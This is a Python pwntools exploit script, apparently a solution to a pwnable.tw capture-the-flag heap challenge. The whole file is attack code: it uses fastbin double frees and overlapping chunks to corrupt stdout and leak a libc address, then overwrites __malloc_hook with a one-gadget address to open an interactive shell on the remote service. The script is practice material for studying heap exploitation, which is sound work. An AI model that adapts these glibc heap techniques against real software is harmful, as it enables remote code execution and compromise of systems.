from pwn import *
r = remote('chall.pwnable.tw', 10308)

def alloc(x, y):
  	r.sendlineafter(':', '1')
  	r.sendlineafter(':', str(x))
  	r.sendafter(':', y)
def free(x):
  	r.sendlineafter(':', '2')
  	r.sendlineafter(':', str(x))
def pwn():
 	alloc(0x68, 'A'*0x8+p64(0x71))
	alloc(0x68, 'B'*0x28+p64(0x21)+'C'*0x20+p64(0x21))
	free(0)
	free(1)
	free(0)
	alloc(0x68, chr(0x10))
	alloc(0x68, 'D'*8+p64(0x71))
	alloc(0x68, 'E')
	alloc(0x68, 'F')
	free(0)
	free(5)
	free(0)
	alloc(0x68, 'G'*0x8+p64(0x91))
	free(5)	
	free(4)	
	alloc(0x68, p64(0)+p64(0x71)+'\xdd\x15')
	alloc(0x68, 'A')
	alloc(0x68, '\x00'*0x33+p64(0xfbad1800)+p64(0)*3+chr(0))
	
	r.recv(0x48)
	libc = u64(r.recv(6).ljust(8, '\x00'))-0x3c46a3#-0x1000
	
	
	r.recvline()
	log.success('Libc @ '+hex(libc))
	
	mhook = libc + 0x3c3b10
	og    = libc + 0xef6c4
	
	free(0)
	free(1)
	free(0)
	alloc(0x68, p64(mhook-0x23))
	alloc(0x68, 'A')
	alloc(0x68, 'A')
	
	alloc(0x68, 'B'*0x13+p64(og))
	r.sendline('1')
	r.sendline('420')
	
	r.interactive()
	
pwn()
